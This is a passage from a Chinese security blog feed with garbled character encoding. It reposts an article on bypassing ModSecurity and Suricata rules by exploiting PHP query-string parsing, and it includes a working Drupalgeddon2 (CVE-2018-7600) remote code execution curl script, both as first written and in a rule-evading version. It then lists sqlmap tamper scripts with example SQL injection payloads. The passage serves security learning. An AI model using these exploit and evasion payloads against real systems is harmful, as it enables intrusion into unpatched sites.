operator">=</span>d3b07384d113edec49eaa6238ad5ff00<span class="token operator">&amp;</span>i<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="WAFï¼ˆModSecurityï¼‰"><a href="#WAFï¼ˆModSecurityï¼‰" class="headerlink" title="WAFï¼ˆModSecurityï¼‰"></a>WAFï¼ˆModSecurityï¼‰</h2><p>æ­¤å¤–ï¼ŒPHPæŸ¥è¯¢å­—ç¬¦ä¸²çš„è§£æç‰¹æ€§ä¹Ÿå¯ç”¨ä»¥ç»•è¿‡WAFã€‚æƒ³è±¡ä¸€ä¸‹,å®ƒçš„è§„åˆ™ç±»ä¼¼äºSecRule !ARGS:news_id â€œ@rx ^[0-9]+$â€ â€œblockâ€ï¼Œè¿™æ˜¾ç„¶å¯ä»¥é€šè¿‡ç›¸åŒçš„æ‰‹æ®µç»•è¿‡ã€‚å¹¸è¿çš„æ˜¯ï¼Œåœ¨ModSecurityä¸­ï¼Œå¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æŒ‡å®šæŸ¥è¯¢å­—ç¬¦ä¸²ä¸­çš„å‚æ•°ã€‚æ¯”å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SecRule <span class="token operator">!</span>ARGS:/news.id/ <span class="token string">"@rx ^[0-9]+$"</span> <span class="token string">"block"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¥ä¸Šè§„åˆ™å°†æ‹¦æˆªè¯¸å¦‚ä»¥ä¸‹çš„è¯·æ±‚ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">â›”ï¸<span class="token operator">/</span><span class="token operator">?</span>news<span class="token punctuation">[</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span><span class="token string single-quoted-string">'â›”ï¸/?news%5bid=1%22+AND+1=1--'</span>â›”ï¸<span class="token operator">/</span><span class="token operator">?</span>news_id<span class="token operator">%</span><span class="token number">00</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">+</span><span class="token keyword">AND</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">--</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="PoC-GTFO"><a href="#PoC-GTFO" class="headerlink" title="PoC || GTFO"></a>PoC || GTFO</h2><p>è®©æˆ‘ä»¬ç”¨Suricataå’ŒDrupal CMSåˆ›å»ºä¸€ä¸ªä»¥åˆ©ç”¨<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a>ï¼ˆDrupalgeddon2è¿œç¨‹æ‰§è¡Œä»£ç ï¼‰çš„ç®€å•PoCã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘å°†åœ¨ä¸¤ä¸ªDockerå®¹å™¨ä¸Šè¿è¡ŒSuricataå’ŒDrupalï¼Œå¹¶å°è¯•ç»•è¿‡Suricataæ”»å‡»Drupalã€‚</p><p>æˆ‘å°†ä½¿ç”¨ä¸¤æ¡Suricataé˜²å¾¡è§„åˆ™ï¼š</p><blockquote><p>â€‹    1.ä¸€æ¡è‡ªå®šä¹‰è§„åˆ™æ‹¦æˆªform_id=user_register_form</p><p>â€‹    2.å¦ä¸€æ¡æ˜¯å…³äºCVE-2018-7600çš„é€šç”¨<a href="https://github.com/ptresearch/AttackDetection/tree/master/CVE-2018-7600">è§„åˆ™</a></p></blockquote><p><img src="https://z3.ax1x.com/2021/07/22/W04Kne.jpg" alt="W04Kne.jpg"></p><p>Suricataå®˜æ–¹å®‰è£…æµç¨‹ç‚¹å‡»<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Ubuntu_Installation_-_Personal_Package_Archives_(PPA)%E3%80%82%E5%AF%B9%E4%BA%8EDrupal%EF%BC%8C%E6%88%91%E8%BF%90%E8%A1%8C%E4%BA%86%E4%B8%80%E4%B8%AAVulhub%E5%AE%B9%E5%99%A8%EF%BC%8C%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8[%E8%BF%99%E9%87%8C](https://github.com/vulhub/vulhub/tree/master/drupal/CVE-2018-7600">è¿™é‡Œ</a>ä¸‹è½½ï¼š</p><p><img src="https://s3.ax1x.com/2021/03/03/6Eyzfe.jpg" alt="6Eyzfe.jpg"></p><p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°è¯•åˆ©ç”¨CVE-2018-7600ã€‚ä¸€ä¸ªåˆ©ç”¨curlå‘½ä»¤çš„å°å‹bashè„šæœ¬ï¼Œæ¯”å¦‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">URL</span><span class="token operator">=</span><span class="token string">"/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax"</span><span class="token assign-left variable">QSTRING</span><span class="token operator">=</span><span class="token string">"form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]="</span><span class="token assign-left variable">COMMAND</span><span class="token operator">=</span><span class="token string">"id"</span><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">${QSTRING}</span><span class="token variable">${COMMAND}</span>"</span> <span class="token string">"http://172.17.0.1:8080<span class="token variable">$URL</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä½ æ‰€è§ï¼Œä¸Šé¢çš„è„šæœ¬å°†æ‰§è¡Œå‘½ä»¤idï¼š</p><p><img src="https://s3.ax1x.com/2021/03/03/6E6POI.jpg" alt="6E6POI.jpg"></p><p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬å°è¯•å¾€Suricataå¯¼å…¥ä»¥ä¸‹ä¸¤æ¡è§„åˆ™ï¼šæˆ‘ç¼–å†™äº†ç¬¬ä¸€ä¸ªè§„åˆ™ï¼Œå®ƒåªæ˜¯å°è¯•form_id=user_register_formåœ¨è¯·æ±‚ä½“å†…è¿›è¡ŒåŒ¹é…; Positive Technology /user/registeråœ¨è¯·æ±‚URLå’Œ#post_renderè¯·æ±‚æ­£æ–‡ä¸­å†™äº†ç¬¬äºŒä¸ªåŒ¹é…é¡¹ã€‚æˆ‘çš„è§„åˆ™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>  msg: <span class="token string">"Possible Drupalgeddon2 attack"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  flow: established, to_server<span class="token punctuation">;</span><span class="token punctuation">\</span>  content: <span class="token string">"/user/register"</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span><span class="token punctuation">\</span>  content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span><span class="token punctuation">\</span>  pcre: <span class="token string">"/form_id=user_register_form/Pi"</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  sid: <span class="token number">10002807</span><span class="token punctuation">;</span><span class="token punctuation">\</span>  rev: <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šç”¨è§„åˆ™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">alert http any any -<span class="token operator">&gt;</span> <span class="token variable">$HOME_NET</span> any <span class="token punctuation">(</span><span class="token punctuation">\</span>  msg: <span class="token string">"ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600)"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  flow: established, to_server<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"/user/register"</span><span class="token punctuation">;</span> http_uri<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"POST"</span><span class="token punctuation">;</span> http_method<span class="token punctuation">;</span> <span class="token punctuation">\</span>  content: <span class="token string">"drupal"</span><span class="token punctuation">;</span> http_client_body<span class="token punctuation">;</span> <span class="token punctuation">\</span>  pcre: <span class="token string">"/(%23|#)(access_callback|pre_render|post_render|lazy_builder)/Pi"</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: cve, <span class="token number">2018</span>-7600<span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: url, research.checkpoint.com/uncovering-drupalgeddon-2<span class="token punctuation">;</span> <span class="token punctuation">\</span>  classtype: attempted-admin<span class="token punctuation">;</span> <span class="token punctuation">\</span>  reference: url, github.com/ptresearch/AttackDetection<span class="token punctuation">;</span> <span class="token punctuation">\</span>  metadata: Open Ptsecurity.com ruleset<span class="token punctuation">;</span> <span class="token punctuation">\</span>  sid: <span class="token number">10002808</span><span class="token punctuation">;</span> <span class="token punctuation">\</span>  rev: <span class="token number">2</span><span class="token punctuation">;</span> <span class="token punctuation">\</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨é‡å¯Suricataåï¼Œæˆ‘çš„æ”»å‡»è¢«æˆåŠŸæŠ¥è­¦ï¼š</p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸¤æ¡æ—¥å¿—ï¼š</p><blockquote><p>â€‹    1.ATTACK [PTsecurity] Drupalgeddon2 &lt;8.3.9 &lt;8.4.6 &lt;8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p><p>â€‹    2.Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -&gt; 172.17.0.1:8080</p></blockquote><h2 id="Bypassï¼"><a href="#Bypassï¼" class="headerlink" title="Bypassï¼"></a>Bypassï¼</h2><p>è¿™ä¸¤æ¡è§„åˆ™å…¶å®éƒ½å¾ˆå®¹æ˜“ç»•è¿‡ã€‚é¦–å…ˆï¼Œå¯¹äºæ•æ„Ÿå­—æ®µform_id=user_register_formï¼Œæˆ‘ä»¬å¯å°†å…¶æ›¿æ¢ä¸ºå¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">form%5bid<span class="token operator">=</span>user_register_form<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚ä¸Šå›¾æ‰€è§ï¼Œç°åœ¨åªæœ‰é€šç”¨è§„åˆ™çš„è­¦æŠ¥ã€‚åˆ†æé€šç”¨è§„åˆ™çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒå¯¹#å’Œ%23æ•æ„Ÿï¼Œä½†ä¸æ¶‰åŠä¸‹åˆ’çº¿çš„ç¼–ç ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨post%5frenderä»£æ›¿post_renderæ¥ç»•è¿‡ï¼š</p><p>æœ€åå¾—å‡ºå¯ç»•è¿‡ä¸¤ä¸ªè§„åˆ™çš„PoCï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">URL</span><span class="token operator">=</span><span class="token string">"/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax"</span><span class="token assign-left variable">QSTRING</span><span class="token operator">=</span><span class="token string">"form%5bid=user_register_form&amp;_drupal_ajax=1&amp;mail[#post%5frender][]=exec&amp;mail[#type]=markup&amp;mail[#markup]="</span><span class="token assign-left variable">COMMAND</span><span class="token operator">=</span><span class="token string">"id"</span><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">${QSTRING}</span><span class="token variable">${COMMAND}</span>"</span> <span class="token string">"http://172.17.0.1:8080<span class="token variable">$URL</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è½¬è‡ª<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2020/02/01/sqlmap-tamper/"/>
      <url>/2020/02/01/sqlmap-tamper/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap-tamper"><a href="#sqlmap-tamper" class="headerlink" title="sqlmap_tamper"></a>sqlmap_tamper</h1><ol><li><p>apostrophemask.py    ç”¨UTF-8å…¨è§’å­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</p></li><li><p>apostrophenullencode.py     ç”¨éæ³•åŒå­—èŠ‚unicodeå­—ç¬¦æ›¿æ¢å•å¼•å·å­—ç¬¦</p></li><li><p>appendnullbyte.py    åœ¨payloadæœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ç¼–ç </p></li><li><p>base64encode.py    å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨Base64ç¼–ç </p></li><li><p>between.py    åˆ†åˆ«ç”¨â€œNOT BETWEEN 0 AND #â€æ›¿æ¢å¤§äºå·â€œ&gt;â€ï¼Œâ€œBETWEEN # AND #â€æ›¿æ¢ç­‰äºå·â€œ=â€</p></li><li><p>bluecoat.py    åœ¨SQLè¯­å¥ä¹‹åç”¨æœ‰æ•ˆçš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦ï¼Œéšåç”¨â€œLIKEâ€æ›¿æ¢ç­‰äºå·â€œ=â€</p></li><li><p>chardoubleencode.py    å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨åŒé‡URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</p></li><li><p>charencode.py    å¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</p></li><li><p>charunicodeencode.py    å¯¹ç»™å®šçš„payloadçš„éç¼–ç å­—ç¬¦ä½¿ç”¨Unicode URLç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰</p></li><li><p>concat2concatws.py    ç”¨â€œCONCAT_WS(MID(CHAR(0), 0, 0), A, B)â€æ›¿æ¢åƒâ€œCONCAT(A, B)â€çš„å®ä¾‹</p></li><li><p>equaltolike.py    ç”¨â€œLIKEâ€è¿ç®—ç¬¦æ›¿æ¢å…¨éƒ¨ç­‰äºå·â€œ=â€</p></li><li><p>greatest.py    ç”¨â€œGREATESTâ€å‡½æ•°æ›¿æ¢å¤§äºå·â€œ&gt;â€</p></li><li><p>halfversionedmorekeywords.py     åœ¨æ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ MySQLæ³¨é‡Š</p></li><li><p>ifnull2ifisnull.py    ç”¨â€œIF(ISNULL(A), B, A)â€æ›¿æ¢åƒâ€œIFNULL(A, B)â€çš„å®ä¾‹</p></li><li><p>lowercase.py    ç”¨å°å†™å€¼æ›¿æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦</p></li><li><p>modsecurityversioned.py     ç”¨æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</p></li><li><p>modsecurityzeroversioned.py     ç”¨å½“ä¸­å¸¦æœ‰æ•°å­—é›¶çš„æ³¨é‡ŠåŒ…å›´å®Œæ•´çš„æŸ¥è¯¢</p></li><li><p>multiplespaces.py    åœ¨SQLå…³é”®å­—å‘¨å›´æ·»åŠ å¤šä¸ªç©ºæ ¼</p></li><li><p>nonrecursivereplacement.py     ç”¨representationsæ›¿æ¢é¢„å®šä¹‰SQLå…³é”®å­—ï¼Œé€‚ç”¨äºè¿‡æ»¤å™¨</p></li><li><p>overlongutf8.py    è½¬æ¢ç»™å®šçš„payloadå½“ä¸­çš„æ‰€æœ‰å­—ç¬¦</p></li><li><p>percentage.py    åœ¨æ¯ä¸ªå­—ç¬¦ä¹‹å‰æ·»åŠ ä¸€ä¸ªç™¾åˆ†å·</p></li><li><p>randomcase.py    éšæœºè½¬æ¢æ¯ä¸ªå…³é”®å­—å­—ç¬¦çš„å¤§å°å†™</p></li><li><p>randomcomments.py    å‘SQLå…³é”®å­—ä¸­æ’å…¥éšæœºæ³¨é‡Š</p></li><li><p>securesphere.py    æ·»åŠ ç»è¿‡ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²</p></li><li><p>sp_password.py    å‘payloadæœ«å°¾æ·»åŠ â€œsp_passwordâ€ for automatic obfuscation from DBMS logs</p></li><li><p>space2comment.py    ç”¨â€œ/**/â€æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2dash.py    ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2hash.py    ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2morehash.py    ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2mssqlblank.py    ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2mssqlhash.py    ç”¨ç£…æ³¨é‡Šç¬¦â€œ#â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2mysqlblank.py    ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2mysqldash.py    ç”¨ç ´æŠ˜å·æ³¨é‡Šç¬¦â€œâ€“â€å…¶æ¬¡æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2plus.py    ç”¨åŠ å·â€œ+â€æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>space2randomblank.py    ç”¨ä¸€ç»„æœ‰æ•ˆçš„å¤‡é€‰å­—ç¬¦é›†å½“ä¸­çš„éšæœºç©ºç™½ç¬¦æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>unionalltounion.py    ç”¨â€œUNION SELECTâ€æ›¿æ¢â€œUNION ALL SELECTâ€</p></li><li><p>unmagicquotes.py    ç”¨ä¸€ä¸ªå¤šå­—èŠ‚ç»„åˆ%bf%27å’Œæœ«å°¾é€šç”¨æ³¨é‡Šä¸€èµ·æ›¿æ¢ç©ºæ ¼ç¬¦</p></li><li><p>varnish.py    æ·»åŠ ä¸€ä¸ªHTTPå¤´â€œX-originating-IPâ€æ¥ç»•è¿‡WAF</p></li><li><p>versionedkeywords.py    ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªéå‡½æ•°å…³é”®å­—</p></li><li><p>versionedmorekeywords.py     ç”¨MySQLæ³¨é‡ŠåŒ…å›´æ¯ä¸ªå…³é”®å­—</p></li><li><p>xforwardedfor.py    æ·»åŠ ä¸€ä¸ªä¼ªé€ çš„HTTPå¤´â€œX-Forwarded-Forâ€æ¥ç»•è¿‡WAF</p></li><li><h3 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å·<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™=â€™1â€)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p><ol start="2"><li><h3 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç <br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND SLEEP(5)#â€)<br> ä½¿ç”¨è„šæœ¬åï¼šMScgQU5EIFNMRUVQKDUpIw==</p><ol start="3"><li><h3 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT foobarâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 UNION SELECT foobar</p><ol start="4"><li><h3 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT+id+FROM+users</p><ol start="5"><li><h3 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT 2â€“â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 UNIOUNIONN SELESELECTCT 2â€“</p><ol start="6"><li><h3 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Did%0DFROM%0Ausers</p><ol start="7"><li><h3 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå°†union allselect æ›¿æ¢ä¸ºunionselect<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜-1 UNION ALL SELECTâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼š-1 UNION SELECT</p><ol start="8"><li><h3 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šè¿½åŠ ç‰¹å®šçš„å­—ç¬¦ä¸²<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 1=1â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND 1=1 and â€˜0havingâ€™=â€™0havingâ€™</p><ol start="9"><li><h3 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šALL<br> ä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºâ€“ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œæ¢è¡Œç¬¦<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1â€“nVNaVoPYeva%0AANDâ€“ngNvzqu%0A9227=9227</p><ol start="10"><li><h3 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMicrosoft SQL Server<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000ã€Microsoft SQL Server 2005<br> ä½œç”¨ï¼šå°†ç©ºæ ¼éšæœºæ›¿æ¢ä¸ºå…¶ä»–ç©ºæ ¼ç¬¦å·(â€˜%01â€™, â€˜%02â€™, â€˜%03â€™, â€˜%04â€™, â€˜%05â€™, â€˜%06â€™, â€˜%07â€™, â€˜%08â€™, â€˜%09â€™, â€˜%0Bâ€™, â€˜%0Câ€™, â€˜%0Dâ€™, â€˜%0Eâ€™, â€˜%0Fâ€™, â€˜%0Aâ€™)<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)<br> ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Eid%0DFROM%07users</p><ol start="11"><li><h3 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br> ä½œç”¨ï¼šç”¨NOT BETWEEN 0 AND #æ›¿æ¢&gt;<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND A &gt; Bâ€“â€™)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND A NOT BETWEEN 0 AND Bâ€“</p><ol start="12"><li><h3 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šASP<br> æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2000, 2005ã€MySQL 5.1.56, 5.5.11ã€PostgreSQL 9.0<br> ä½œç”¨ï¼šåœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ä¸€ä¸ª%<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM TABLEâ€™)<br> ä½¿ç”¨è„šæœ¬</p><p>åï¼š%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><ol start="13"><li><h3 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h3></li></ol><p>é€‚ç”¨æ•°æ®åº“ï¼šMSSQL<br> ä½œç”¨ï¼šä»T-SQLæ—¥å¿—çš„è‡ªåŠ¨è¿·ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·ä¸­è¿½åŠ sp_password<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 AND 9227=9227â€“ â€˜)<br> ä½¿ç”¨è„šæœ¬åï¼š1 AND 9227=9227â€“ sp_password</p><ol start="14"><li><h3 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h3></li></ol><p>æµ‹è¯•é€šè¿‡æ•°æ®åº“ï¼šMicrosoft SQL Server 2005ã€MySQL 4, 5.0 and 5.5ã€Oracle 10gã€PostgreSQL 8.3, 8.4, 9.0<br> ä½œç”¨ï¼šå¯¹ç»™å®šçš„payloadå…¨éƒ¨å­—ç¬¦ä½¿ç”¨urlç¼–ç ï¼ˆä¸å¤„ç†å·²ç»ç¼–ç çš„å­—ç¬¦ï¼‰<br> ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT FIELD FROM%20TABLEâ€™)<br> ä½¿ç”¨è„šæœ¬</p><p>åï¼š%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</p><ol start="15"><li><h3 